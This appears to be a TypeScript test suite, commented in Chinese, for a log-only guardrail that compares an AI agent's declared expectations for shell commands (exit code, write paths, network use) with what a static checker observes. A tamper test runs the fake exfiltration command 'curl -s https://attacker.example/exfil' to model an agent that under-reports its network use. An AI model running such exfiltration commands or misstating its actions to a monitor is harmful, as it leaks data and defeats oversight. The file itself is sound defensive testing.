/**
 * #328 execution contract 护栏 shadow spike — v0 acceptance tests.
 *
 * Covers:
 * - propose 清洗（纯函数）：字段裁剪 / EMPTY_EXPECT / 未知字段不进合同
 * - match（纯函数）：exit / writes_prefix / net / hwnd_stable unobserved
 * - 静态启发式：重定向+tee 写路径解析、出网扫描
 * - shadow 语义（票面验收）：expect 被篡改（net:false vs 实际出网）
 *   → would_stop:true 写审计，但执行结果原样返回、线程继续（不 STOP_THREAD）
 * - 默认关零行为变化：flag 默认 false；dispatch 返回 TOOL_NOT_OFFERED；
 *   adapter 源级断言（不 offer）；checker 源级断言（无 LLM import）
 */
import test, { after, before, describe } from "node:test"
import assert from "node:assert/strict"
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "cmspark-exec-contract-"))
process.env.HOME = tmp
process.env.CMSPARK_DATA_DIR = tmp

let ec: typeof import("../src/tool/execution-contract")
let getAuditLogPath: typeof import("../src/packs/audit-log").getAuditLogPath

before(async () => {
  const config = await import("../src/config")
  await config.initDataDir()
  ec = await import("../src/tool/execution-contract")
  ;({ getAuditLogPath } = await import("../src/packs/audit-log"))
})

after(() => {
  fs.rmSync(tmp, { recursive: true, force: true })
})

function readSrc(...parts: string[]): string {
  const candidates = [
    path.join(__dirname, "..", "src", ...parts),
    path.join(__dirname, "../src", ...parts),
    path.join(process.cwd(), "src", ...parts),
  ]
  for (const p of candidates) {
    if (fs.existsSync(p)) return fs.readFileSync(p, "utf8")
  }
  throw new Error("src not found: " + parts.join("/"))
}

function readAuditEvents(): any[] {
  const p = getAuditLogPath()
  if (!fs.existsSync(p)) return []
  return fs
    .readFileSync(p, "utf8")
    .split("\n")
    .filter(Boolean)
    .map((l) => JSON.parse(l))
}

async function setShadowFlag(on: boolean): Promise<void> {
  const config = await import("../src/config")
  config.saveConfig({
    security: { ...config.getConfig().security, execution_contract_shadow: on },
  } as any)
}

// ---------------------------------------------------------------------------
// sanitizeContractExpect（纯）
// ---------------------------------------------------------------------------

describe("sanitizeContractExpect", () => {
  test("keeps valid fields, drops unknown/garbage", () => {
    const r = ec.sanitizeContractExpect({
      exit: 0,
      writes_prefix: ["/tmp/out", "", 42, "/a/b"],
      net: false,
      hwnd_stable: true,
      http_status: 200, // v0 禁用谓词 —— 必须被丢弃，永不进入合同
      dom_selector: "#ok",
    })
    assert.equal(r.ok, true)
    if (r.ok) {
      assert.deepEqual(r.expect, {
        exit: 0,
        writes_prefix: ["/tmp/out", "/a/b"],
        net: false,
        hwnd_stable: true,
      })
    }
  })

  test("empty / all-garbage expect → EMPTY_EXPECT", () => {
    assert.deepEqual(ec.sanitizeContractExpect({}), { ok: false, error_code: "EMPTY_EXPECT" })
    assert.deepEqual(ec.sanitizeContractExpect({ exit: 3.5, net: "no" }), {
      ok: false,
      error_code: "EMPTY_EXPECT",
    })
    assert.deepEqual(ec.sanitizeContractExpect(null), { ok: false, error_code: "EMPTY_EXPECT" })
    assert.deepEqual(ec.sanitizeContractExpect("x"), { ok: false, error_code: "EMPTY_EXPECT" })
  })

  test("caps writes_prefix count and length", () => {
    const r = ec.sanitizeContractExpect({
      writes_prefix: Array.from({ length: 20 }, (_, i) => `/p${i}`),
    })
    assert.equal(r.ok, true)
    if (r.ok) assert.equal(r.expect.writes_prefix!.length, 8)
  })
})

// ---------------------------------------------------------------------------
// 静态启发式（纯）
// ---------------------------------------------------------------------------

describe("static heuristics", () => {
  test("extractShellWrites: redirections resolved against cwd", () => {
    const writes = ec.extractShellWrites("echo hi > out.txt && cat x >> /abs/log.txt", "/work/dir")
    assert.ok(writes.includes(path.resolve("/work/dir", "out.txt")))
    assert.ok(writes.includes("/abs/log.txt"))
  })

  test("extractShellWrites: fd dup (2>&1) and /dev/null are not writes", () => {
    const writes = ec.extractShellWrites("cmd 2>&1 >/dev/null", "/work")
    assert.deepEqual(writes, [])
  })

  test("extractShellWrites: tee targets", () => {
    const writes = ec.extractShellWrites("make | tee -a build.log", "/w")
    assert.ok(writes.includes(path.resolve("/w", "build.log")))
  })

  test("detectShellNet: indicators for curl / url literal / git push / pkg install", () => {
    assert.equal(ec.detectShellNet("curl -s https://x.example").net, true)
    assert.equal(ec.detectShellNet("git push origin main").net, true)
    assert.equal(ec.detectShellNet("npm install left-pad").net, true)
    const clean = ec.detectShellNet("ls -la && echo done")
    assert.equal(clean.net, false)
    assert.deepEqual(clean.indicators, [])
  })
})

// ---------------------------------------------------------------------------
// matchContract（纯函数判决）
// ---------------------------------------------------------------------------

describe("matchContract", () => {
  const baseObserve = {
    exit_code: 0,
    writes: [] as string[],
    net: false,
    net_indicators: [] as string[],
    heuristics: ["writes_static_parse", "net_static_scan"],
  }

  test("all expectations satisfied → match, would_stop false", () => {
    const v = ec.matchContract({ exit: 0, net: true }, baseObserve)
    assert.equal(v.match, true)
    assert.equal(v.would_stop, false)
    assert.deepEqual(v.diffs, [])
  })

  test("exit mismatch → would_stop true with field-level diff", () => {
    const v = ec.matchContract({ exit: 0 }, { ...baseObserve, exit_code: 1 })
    assert.equal(v.would_stop, true)
    assert.deepEqual(v.diffs, [{ field: "exit", expected: 0, actual: 1 }])
  })

  test("writes outside declared prefixes → diff lists offending paths", () => {
    const v = ec.matchContract(
      { writes_prefix: ["/tmp/allowed"] },
      { ...baseObserve, writes: ["/tmp/allowed/a.txt", "/etc/passwd"] },
    )
    assert.equal(v.would_stop, true)
    assert.equal(v.diffs[0]!.field, "writes_prefix")
    assert.deepEqual(v.diffs[0]!.actual, ["/etc/passwd"])
  })

  test("expect net:false vs observed net:true (tampered/under-claimed) → would_stop true", () => {
    const v = ec.matchContract(
      { net: false },
      { ...baseObserve, net: true, net_indicators: ["net_tool"] },
    )
    assert.equal(v.would_stop, true)
    assert.deepEqual(v.diffs, [{ field: "net", expected: false, actual: true }])
  })

  test("expect net:true but not observed → NO diff (heuristic cannot disprove)", () => {
    const v = ec.matchContract({ net: true }, baseObserve)
    assert.equal(v.would_stop, false)
  })

  test("hwnd_stable is unobservable for shell_exec → unobserved, never a mismatch", () => {
    const v = ec.matchContract({ hwnd_stable: false }, baseObserve)
    assert.equal(v.would_stop, false)
    assert.deepEqual(v.unobserved, ["hwnd_stable"])
  })

  test("unobserved exit (aborted pre-start) → not counted as mismatch", () => {
    const v = ec.matchContract({ exit: 0 }, { ...baseObserve, exit_code: null })
    assert.equal(v.would_stop, false)
    assert.deepEqual(v.unobserved, ["exit"])
  })
})

// ---------------------------------------------------------------------------
// shadow 语义：不一致只记录，执行继续（票面验收断言）
// ---------------------------------------------------------------------------

describe("shadow: log-only, thread continues", () => {
  test("tampered expect (net:false vs actual net) → would_stop:true audited, result untouched", async () => {
    await setShadowFlag(true)
    ec.clearContractsForTest()
    const tid = "ec-shadow-tamper"

    ec.registerContract(tid, {
      tool: "shell_exec",
      expect: { exit: 0, net: false }, // 被篡改/欠报：命令实际出网
      proposed_at: new Date().toISOString(),
    })

    const shellResult = {
      success: true,
      data: { exit_code: 0, timed_out: false, aborted: false, stdout: "ok" },
    }
    const before = JSON.stringify(shellResult)
    // 这就是 dispatch 在 shell_exec 后调用的同一个钩子：
    ec.observeShellExecShadow({
      threadId: tid,
      params: { command: "curl -s https://attacker.example/exfil", cwd: "/tmp" },
      result: shellResult,
    })
    // 线程继续：结果对象零改动，钩子不 throw、不 STOP_THREAD。
    assert.equal(JSON.stringify(shellResult), before)

    const events = readAuditEvents().filter((e) => e.type === "execution_contract.shadow")
    assert.equal(events.length, 1)
    const ev = events[0]!
    assert.equal(ev.thread_id, tid)
    assert.equal(ev.would_stop, true)
    assert.equal(ev.shadow, true)
    assert.equal(ev.action_taken, "none")
    assert.deepEqual(ev.diffs, [{ field: "net", expected: false, actual: true }])
    assert.ok(ev.observe.net_indicators.includes("net_tool"))
    assert.ok(ev.observe.heuristics.includes("net_static_scan"))

    // 合同已被消费（一次性）：第二次执行无合同 → 无新审计行。
    ec.observeShellExecShadow({
      threadId: tid,
      params: { command: "curl -s https://attacker.example/again", cwd: "/tmp" },
      result: shellResult,
    })
    assert.equal(
      readAuditEvents().filter((e) => e.type === "execution_contract.shadow").length,
      1,
    )
  })

  test("flag off → shadow hook is a strict no-op even with a registered contract", async () => {
    await setShadowFlag(false)
    ec.clearContractsForTest()
    const tid = "ec-shadow-off"
    ec.registerContract(tid, {
      tool: "shell_exec",
      expect: { net: false },
      proposed_at: new Date().toISOString(),
    })
    const n0 = readAuditEvents().filter((e) => e.type === "execution_contract.shadow").length
    ec.observeShellExecShadow({
      threadId: tid,
      params: { command: "curl https://x.example", cwd: "/tmp" },
      result: { success: true, data: { exit_code: 0 } },
    })
    assert.equal(
      readAuditEvents().filter((e) => e.type === "execution_contract.shadow").length,
      n0,
    )
    // 合同未被消费（flag 关时登记簿不参与任何路径）。
    assert.equal(ec.contractCountForTest(), 1)
    ec.clearContractsForTest()
  })
})

// ---------------------------------------------------------------------------
// 默认关：dispatch TOOL_NOT_OFFERED + 工具不 offer（回归=零行为变化）
// ---------------------------------------------------------------------------

describe("default-off behavior", () => {
  test("flag defaults to false (DEFAULT_CONFIG source + getter semantics)", () => {
    const src = readSrc("config.ts")
    assert.match(src, /execution_contract_shadow: false/)
    assert.equal(ec.isExecutionContractShadowEnabled({}), false)
    assert.equal(ec.isExecutionContractShadowEnabled({ execution_contract_shadow: false }), false)
    assert.equal(ec.isExecutionContractShadowEnabled({ execution_contract_shadow: true }), true)
  })

  test("dispatch: flag off → TOOL_NOT_OFFERED (explicit error, not silent ok)", async () => {
    await setShadowFlag(false)
    const { ThreadManager } = await import("../src/threads/thread-manager")
    const dispatch = await import("../src/tool/companion-dispatch")
    const tm = new ThreadManager()
    const th = tm.create("ec-off-dispatch")
    dispatch.bindCompanionDispatchRuntime({
      getThreadManager: () => tm,
      getSkillEngine: () => null as any,
      getCachedTabUrl: () => undefined,
      getTabUrlCache: () => new Map(),
      computerTaskAbort: new Map(),
      computerRateLimiter: async () => null as any,
      getComputerRateLimiterSingleton: () => null,
      securityConfirmations: {
        request: async () => ({ confirmationId: "", approved: false, reason: "disconnect" as const }),
      } as any,
      getComputerEstopEnsureOverride: () => null,
      rejectPendingForThread: () => 0,
      hasPendingForTab: () => false,
      rejectPendingForTab: () => 0,
    })
    const r = await dispatch.executeCompanionTool(
      "execution_contract_propose",
      { __thread_id: th.id, tool: "shell_exec", expect: { exit: 0 } },
      "tc-ec-off",
      { handshakeSurface: "tray" },
    )
    assert.equal(r.success, false)
    assert.equal(r.data?.error_code, "TOOL_NOT_OFFERED")
    assert.equal(ec.contractCountForTest(), 0)
  })

  test("dispatch: flag on → propose registers and writes propose audit (registration only)", async () => {
    await setShadowFlag(true)
    ec.clearContractsForTest()
    const { ThreadManager } = await import("../src/threads/thread-manager")
    const dispatch = await import("../src/tool/companion-dispatch")
    const tm = new ThreadManager()
    const th = tm.create("ec-on-dispatch")
    dispatch.bindCompanionDispatchRuntime({
      getThreadManager: () => tm,
      getSkillEngine: () => null as any,
      getCachedTabUrl: () => undefined,
      getTabUrlCache: () => new Map(),
      computerTaskAbort: new Map(),
      computerRateLimiter: async () => null as any,
      getComputerRateLimiterSingleton: () => null,
      securityConfirmations: {
        request: async () => ({ confirmationId: "", approved: false, reason: "disconnect" as const }),
      } as any,
      getComputerEstopEnsureOverride: () => null,
      rejectPendingForThread: () => 0,
      hasPendingForTab: () => false,
      rejectPendingForTab: () => 0,
    })
    const r = await dispatch.executeCompanionTool(
      "execution_contract_propose",
      {
        __thread_id: th.id,
        tool: "shell_exec",
        args_digest: "abc123",
        expect: { exit: 0, writes_prefix: ["/tmp"] },
      },
      "tc-ec-on",
      { handshakeSurface: "tray" },
    )
    assert.equal(r.success, true, r.error || "propose ok")
    assert.equal(r.data?.registered, true)
    assert.equal(r.data?.shadow, true)
    assert.match(String(r.data?.note), /no execution permission/)
    assert.equal(ec.contractCountForTest(), 1)
    const proposes = readAuditEvents().filter(
      (e) => e.type === "execution_contract.propose" && e.thread_id === th.id,
    )
    assert.equal(proposes.length, 1)
    assert.deepEqual(proposes[0].expect, { exit: 0, writes_prefix: ["/tmp"] })

    // summoner / 无 handshake → SUMMONER_ACL（同 run_progress_propose）
    const r2 = await dispatch.executeCompanionTool(
      "execution_contract_propose",
      { __thread_id: th.id, tool: "shell_exec", expect: { exit: 0 }, surface: "tray" },
      "tc-ec-summoner",
      { handshakeSurface: "summoner" },
    )
    assert.equal(r2.success, false)
    assert.equal(r2.data?.error_code, "SUMMONER_ACL")

    // 不支持的工具 → UNSUPPORTED_TOOL
    const r3 = await dispatch.executeCompanionTool(
      "execution_contract_propose",
      { __thread_id: th.id, tool: "host_write", expect: { exit: 0 } },
      "tc-ec-unsupported",
      { handshakeSurface: "tray" },
    )
    assert.equal(r3.success, false)
    assert.equal(r3.data?.error_code, "UNSUPPORTED_TOOL")
    ec.clearContractsForTest()
    await setShadowFlag(false)
  })
})

// ---------------------------------------------------------------------------
// 源级锁定（红线自证）
// ---------------------------------------------------------------------------

describe("source-level locks", () => {
  test("checker module never imports LLM machinery (machine-checked, no LLM self-judgement)", () => {
    const src = readSrc("tool", "execution-contract.ts")
    assert.doesNotMatch(src, /from\s+["']\.\.\/llm\//)
    assert.doesNotMatch(src, /from\s+["'][^"']*adapter["']/)
    assert.doesNotMatch(src, /createChat|chatCompletion|callLlm/i)
  })

  test("adapter does not offer the tool while the shadow flag is off", () => {
    const src = readSrc("llm", "adapter.ts")
    assert.match(src, /isExecutionContractShadowEnabled\(\)/)
    assert.match(src, /t\.function\.name !== EXECUTION_CONTRACT_PROPOSE_TOOL/)
  })

  test("tool catalog + COMPANION_TOOLS lockstep includes execution_contract_propose", async () => {
    const { COMPANION_TOOLS } = await import("../src/bridge/companion-tools")
    assert.ok(COMPANION_TOOLS.includes("execution_contract_propose"))
    const { getToolDefinition } = await import("../src/bridge/tool-definitions")
    const def = getToolDefinition("execution_contract_propose")
    assert.deepEqual(def.function.parameters.required, ["tool", "expect"])
    // HTTP/DOM 谓词必须不在 LLM 可见 schema 里（攻击者可喂真，v0 禁用）。
    const props = Object.keys(
      (def.function.parameters.properties as any).expect.properties,
    ).sort()
    assert.deepEqual(props, ["exit", "hwnd_stable", "net", "writes_prefix"])
  })

  test("l2-admission untouched by this spike (zero-diff self-check happens in CI/PR)", () => {
    // 运行期等价断言：shadow 模块不 import l2-admission，shell_exec 的 L2
    // 路径（security_token）在 dispatch 内先于 shadow 钩子，且钩子不改 result。
    const src = readSrc("tool", "execution-contract.ts")
    assert.doesNotMatch(src, /l2-admission/)
    const dispatch = readSrc("tool", "companion-dispatch.ts")
    const shellCase = dispatch.slice(dispatch.indexOf('case "shell_exec"'))
    const hookIdx = shellCase.indexOf("observeShellExecShadow")
    const tokenIdx = shellCase.indexOf("requires L2 security_token confirmation")
    assert.ok(tokenIdx > 0 && hookIdx > tokenIdx, "shadow hook runs only after the L2 token gate")
    assert.match(shellCase, /return shellResult/)
  })
})
